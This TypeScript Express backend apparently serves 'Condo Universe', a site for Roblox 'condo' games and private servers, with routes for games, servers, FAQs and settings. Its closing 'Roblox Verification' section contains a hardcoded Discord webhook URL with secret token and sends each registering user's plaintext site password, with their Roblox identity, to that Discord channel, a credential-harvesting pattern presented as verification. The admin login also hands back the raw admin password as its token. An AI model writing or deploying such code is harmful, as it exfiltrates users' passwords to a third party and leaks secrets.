import express from "express";
import cors from "cors";
import { createClient } from "@supabase/supabase-js";

const app = express();
app.use(cors());
app.use(express.json());

// --- Supabase clients ---
function getSupabaseUrl(): string {
  const raw = process.env.SUPABASE_URL ?? "";
  const match = raw.match(/supabase\.com\/dashboard\/project\/([a-z0-9]+)/);
  return match ? `https://${match[1]}.supabase.co` : raw;
}

const supabaseUrl = getSupabaseUrl();
const supabaseAnon = createClient(supabaseUrl, process.env.SUPABASE_ANON_KEY ?? "");
const supabaseAdmin = createClient(supabaseUrl, process.env.SUPABASE_SERVICE_ROLE_KEY ?? "");

// --- Auth middleware ---
function requireAdmin(req: express.Request, res: express.Response, next: express.NextFunction): void {
  const auth = req.headers["authorization"];
  const token = auth?.startsWith("Bearer ") ? auth.slice(7) : undefined;
  if (!process.env.ADMIN_PASSWORD || token !== process.env.ADMIN_PASSWORD) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

// --- Auth routes ---
app.post("/api/auth/login", (req, res) => {
  const { password } = req.body ?? {};
  if (!password || password !== process.env.ADMIN_PASSWORD) {
    res.status(401).json({ success: false, token: "" });
    return;
  }
  res.json({ success: true, token: process.env.ADMIN_PASSWORD });
});

app.post("/api/auth/logout", (_req, res) => {
  res.json({ success: true });
});

// --- Games ---
app.get("/api/games", async (_req, res) => {
  const { data, error } = await supabaseAnon.from("games").select("*").order("created_at", { ascending: false });
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json(data ?? []);
});

app.post("/api/games", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("games").insert(req.body).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.status(201).json(data);
});

app.patch("/api/games/:id", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("games").update(req.body).eq("id", req.params.id).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  if (!data) { res.status(404).json({ error: "Game not found" }); return; }
  res.json(data);
});

app.delete("/api/games/:id", requireAdmin, async (req, res) => {
  const { error } = await supabaseAdmin.from("games").delete().eq("id", req.params.id);
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json({ success: true });
});

// --- Servers ---
app.get("/api/servers", async (_req, res) => {
  const { data, error } = await supabaseAnon.from("servers").select("*").order("created_at", { ascending: false });
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json(data ?? []);
});

app.post("/api/servers", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("servers").insert(req.body).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.status(201).json(data);
});

app.patch("/api/servers/:id", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("servers").update(req.body).eq("id", req.params.id).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  if (!data) { res.status(404).json({ error: "Server not found" }); return; }
  res.json(data);
});

app.delete("/api/servers/:id", requireAdmin, async (req, res) => {
  const { error } = await supabaseAdmin.from("servers").delete().eq("id", req.params.id);
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json({ success: true });
});

// --- FAQs ---
app.get("/api/faqs", async (_req, res) => {
  const { data, error } = await supabaseAnon.from("faqs").select("*").order("order_index", { ascending: true });
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json(data ?? []);
});

app.post("/api/faqs", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("faqs").insert({ order_index: 0, ...req.body }).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.status(201).json(data);
});

app.patch("/api/faqs/:id", requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.from("faqs").update(req.body).eq("id", req.params.id).select().single();
  if (error) { res.status(500).json({ error: error.message }); return; }
  if (!data) { res.status(404).json({ error: "FAQ not found" }); return; }
  res.json(data);
});

app.delete("/api/faqs/:id", requireAdmin, async (req, res) => {
  const { error } = await supabaseAdmin.from("faqs").delete().eq("id", req.params.id);
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json({ success: true });
});

// --- Settings ---
const DEFAULT_SETTINGS = {
  tiktok_url: null,
  hero_title: "CONDO UNIVERSE",
  hero_subtitle: "Exclusive Condo Games & Private Servers",
  announcement: null,
};

app.get("/api/settings", async (_req, res) => {
  const { data, error } = await supabaseAnon.from("site_settings").select("*").limit(1).maybeSingle();
  if (error) { res.status(500).json({ error: error.message }); return; }
  res.json(data ?? { id: "default", ...DEFAULT_SETTINGS });
});

app.patch("/api/settings", requireAdmin, async (req, res) => {
  const { data: existing } = await supabaseAdmin.from("site_settings").select("id").limit(1).maybeSingle();
  let result;
  if (existing) {
    result = await supabaseAdmin.from("site_settings").update(req.body).eq("id", existing.id).select().single();
  } else {
    result = await supabaseAdmin.from("site_settings").insert({ ...DEFAULT_SETTINGS, ...req.body }).select().single();
  }
  if (result.error) { res.status(500).json({ error: result.error.message }); return; }
  res.json(result.data);
});



  // --- Roblox Verification ---
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1519031135131271402/7QBoSBRDj7iB4T0DAISmV5cdmWPcXpGJwBM086w0tM6rqdkKJpOi8mVvSqGxu-4EtOhN";
  const ROBLOX_MIN_DAYS = 70;

  app.post("/api/verify/check", async (req: express.Request, res: express.Response): Promise<void> => {
    const { username } = (req.body as { username?: string }) ?? {};
    if (!username || typeof username !== "string") {
      res.status(400).json({ error: "Username is required" });
      return;
    }
    try {
      const searchRes = await fetch("https://users.roblox.com/v1/usernames/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ usernames: [username.trim()], excludeBannedUsers: false }),
      });
      const searchData = await searchRes.json() as { data: { id: number; name: string; displayName: string }[] };
      if (!searchData.data || searchData.data.length === 0) {
        res.status(404).json({ error: "Conta nao encontrada. Verifique o nome de usuario." });
        return;
      }
      const foundUser = searchData.data[0];
      const foundUserId = foundUser.id;
      const userRes = await fetch("https://users.roblox.com/v1/users/" + foundUserId);
      const userData = await userRes.json() as { id: number; name: string; displayName: string; created: string; description: string; isBanned: boolean };
      const ageDays = Math.floor((Date.now() - new Date(userData.created).getTime()) / 86400000);
      if (ageDays < ROBLOX_MIN_DAYS) {
        res.status(403).json({ error: "Conta muito nova. Sua conta tem " + ageDays + " dias. O minimo exigido e " + ROBLOX_MIN_DAYS + " dias.", ageDays, required: ROBLOX_MIN_DAYS });
        return;
      }
      const avatarRes = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + foundUserId + "&size=150x150&format=Png&isCircular=true");
      const avatarData = await avatarRes.json() as { data: { imageUrl: string }[] };
      const avatarUrl = avatarData.data?.[0]?.imageUrl ?? null;
      res.json({ id: foundUserId, username: userData.name, displayName: userData.displayName, created: userData.created, ageDays, avatarUrl, description: userData.description });
    } catch {
      res.status(500).json({ error: "Erro ao verificar conta. Tente novamente." });
    }
  });

  app.post("/api/verify/register", async (req: express.Request, res: express.Response): Promise<void> => {
    const { robloxId, robloxUsername, displayName, avatarUrl, ageDays, created, sitePassword } = (req.body as Record<string, string>) ?? {};
    if (!robloxUsername || !sitePassword) { res.status(400).json({ error: "Dados incompletos" }); return; }
    try {
      const createdDate = new Date(created).toLocaleDateString("pt-BR");
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "Novo Membro Verificado - Condo Universe",
            color: 0xe31221,
            thumbnail: { url: avatarUrl ?? "" },
            fields: [
              { name: "Usuario Roblox", value: "**" + robloxUsername + "**", inline: true },
              { name: "Nome de exibicao", value: displayName || robloxUsername, inline: true },
              { name: "ID Roblox", value: String(robloxId), inline: true },
              { name: "Conta criada em", value: createdDate, inline: true },
              { name: "Idade da conta", value: ageDays + " dias", inline: true },
              { name: "Senha do site", value: sitePassword, inline: false },
            ],
            footer: { text: "Condo Universe - Verificacao automatica" },
            timestamp: new Date().toISOString(),
          }],
        }),
      });
      res.json({ success: true });
    } catch {
      res.status(500).json({ error: "Erro ao enviar dados." });
    }
  });
  
export default app;
